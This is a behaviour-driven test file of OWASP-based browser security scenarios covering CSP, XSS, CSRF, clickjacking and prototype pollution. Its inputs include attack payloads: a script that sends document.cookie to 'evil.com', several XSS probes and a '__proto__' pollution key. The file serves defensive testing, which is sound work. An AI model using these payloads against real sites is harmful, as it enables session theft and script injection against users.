Feature: OWASP frontend and browser controls (@security scenarios)
  Executable @security scenarios drawn from the per-sheet cheat-sheet files in this category.
  In an adopting repo these merge into the single shared feature-file index (see bdd-comprehensive-testing).
  Each mirrors the @security scenario in its references/cheatsheets/<Slug>.md file.

  # from Browser_Extension_Vulnerabilities
  @security @owasp:browser-extension
  Scenario: The service worker ignores a privileged message from an untrusted sender
    Given an extension service worker that performs a privileged "fetchSecret" action on request
    When a message requesting "fetchSecret" arrives whose sender.id is not the extension's own id
    Then the handler returns without performing the fetch
    And no secret or privileged result is sent back to the caller

  # from Clickjacking_Defense
  @security @owasp:clickjacking @usecase:block-iframe-embedding
  Scenario: A sensitive page refuses to render inside an attacker's iframe
    Given the account-settings page is served with "Content-Security-Policy: frame-ancestors 'none'"
    When an attacker page at "https://evil.com" loads it inside an "<iframe>"
    Then the browser refuses to render the page in the frame
    And the user cannot be tricked into clicking its controls through an overlay

  # from Content_Security_Policy
  @security @owasp:csp @usecase:block-injected-inline-script
  Scenario: A strict nonce-based CSP blocks an injected inline script
    Given every response sends "Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic'; object-src 'none'; base-uri 'none'"
    And each legitimate script tag carries the per-response nonce
    When an attacker injects "<script>document.location='https://evil.com/'+document.cookie</script>" into a rendered field
    Then the browser refuses to execute the injected script because it has no valid nonce
    And a violation report is sent to the configured reporting endpoint

  # from Cookie_Theft_Mitigation
  @security @owasp:cookie-theft @usecase:stolen-cookie-replay
  Scenario: A replayed session cookie from a new environment forces reauthentication
    Given a session whose baseline IP region and "User-Agent" were stored when it was created
    When a request carrying that cookie arrives on a sensitive endpoint from a different region and device
    Then the request is blocked and the suspect session is restricted or invalidated
    And access is restored only after reauthentication with an account-bound authenticator

  # from Cross_Site_Scripting_Prevention
  @security @owasp:xss @usecase:stored-xss
  Scenario: User-submitted content cannot inject an executable script
    Given a page that stores and renders user-submitted text
    When a user submits the comment "<script>alert(document.cookie)</script>"
    Then the stored value is rendered as inert text through contextual output encoding
    And no script executes in another user's browser

  # from Cross-Site_Request_Forgery_Prevention
  @security @owasp:csrf @usecase:state-change-requires-token
  Scenario: A funds-transfer POST without a valid CSRF token is rejected
    Given an authenticated user session on the banking app
    And the server issued a per-session synchronizer token stored in the session
    When a cross-site page submits a POST to "/transfer" using the victim's cookies but no matching CSRF token
    Then the server rejects the request with "403" and makes no transfer
    And the attempt is logged as a possible CSRF event

  # from DOM_based_XSS_Prevention
  @security @owasp:dom-xss @usecase:fragment-to-sink
  Scenario: A page renders URL fragment data as text, not markup
    Given a page that reads untrusted data from "location.hash"
    When an attacker loads the page with the fragment "#<img src=x onerror=alert(1)>"
    Then the value is written to the DOM through "textContent" so it displays as inert text
    And no script runs and no "innerHTML" or "document.write" sink receives the raw value

  # from DOM_Clobbering_Prevention
  @security @owasp:dom-clobbering @usecase:clobbered-redirect
  Scenario: Injected named HTML cannot override a redirect target
    Given a page that reads its redirect target from a declared local variable
    And untrusted markup is sanitized before it enters the DOM
    When an attacker injects "<a id=redirectTo href='javascript:alert(1)'></a>"
    Then the sanitizer strips or namespaces the "id" attribute
    And the redirect target keeps its declared default value
    And no attacker-controlled navigation or script execution occurs

  # from HTML5_Security
  @security @owasp:html5 @usecase:postmessage-origin-and-data
  Scenario: A cross-document message from an untrusted origin is rejected and never executed
    Given a page that handles "message" events and expects messages only from "https://trusted.example.com"
    When a message arrives whose "origin" does not exactly match the expected FQDN
    Then the handler ignores the message
    And any accepted payload is written with "textContent" and never with "innerHTML" or "eval"

  # from HTTP_Headers
  @security @owasp:http-headers @usecase:response-hardening-headers
  Scenario: A rendered page response ships the baseline security headers
    Given an endpoint that returns an HTML page the browser will render
    When a client requests the page over HTTPS
    Then the response sets "Strict-Transport-Security" with a long "max-age", "X-Content-Type-Options: nosniff", and a "Content-Security-Policy" that restricts script sources
    And the response omits fingerprinting headers such as a detailed "Server" value and any "X-Powered-By"

  # from Micro_Frontend_Security
  @security @owasp:micro-frontend @usecase:server-side-authorization
  Scenario: The backend ignores a frontend-supplied role and checks real permissions
    Given a host shell that composes an independently deployed remote micro-frontend
    When the remote requests a privileged operation with a forged "admin" role flag in the payload
    Then the server re-checks the user's real permissions for that operation, resource, and tenant
    And the request is denied because the authenticated user does not hold the permission

  # from Prototype_Pollution_Prevention
  @security @owasp:prototype-pollution @usecase:proto-key-merge
  Scenario: A crafted __proto__ key cannot reach Object.prototype
    Given code that copies attacker-supplied keys into an object
    And the target object is created with "Object.create(null)"
    When an attacker submits a payload with the key path "__proto__.isAdmin" set to true
    Then the write lands on the prototype-less target, not on "Object.prototype"
    And a freshly created "{}" still has no "isAdmin" property

  # from Third_Party_Javascript_Management
  @security @owasp:third-party-js @usecase:subresource-integrity
  Scenario: A tampered vendor script is blocked by Subresource Integrity
    Given a host page that loads a vendor analytics script with an "integrity" hash and "crossorigin=anonymous"
    When the vendor server returns a script whose bytes no longer match the recorded hash
    Then the browser refuses to execute the script
    And the host page keeps working without running the altered third-party code

  # from Web_Frontend_Security
  @security @owasp:web-frontend @usecase:dom-xss-innerhtml
  Scenario: Untrusted API data is shown as text, not parsed as HTML
    Given a page that displays a comment taken from an API response
    When the API returns the value "<img src=abc onerror=alert('xss!')>"
    Then the page writes it through "textContent" so the markup appears as literal text
    And no script runs and the DOM gains no element from the value

  # from XS_Leaks
  @security @owasp:xs-leaks
  Scenario: A sensitive endpoint rejects a cross-site request so no error-event oracle leaks
    Given an authenticated endpoint that applies a Fetch Metadata resource isolation policy
    When a request arrives with the header Sec-Fetch-Site set to "cross-site"
    Then the server responds 403 and returns no resource
    And the attacker's page cannot tell from onload or onerror whether the resource exists

  # from XSS_Filter_Evasion
  @security @owasp:xss-filter-evasion
  Scenario: Input crafted to bypass a blocklist filter is still neutralized by output encoding
    Given a page that renders user-supplied text through a framework that auto-encodes for the output context
    And an attacker has mutated a script-bearing input so that it evades the application's blocklist filter
    When the attacker submits that filter-bypassing input and the value is later rendered
    Then the value is encoded for its context and displayed as inert text
    And no script executes in the victim's browser
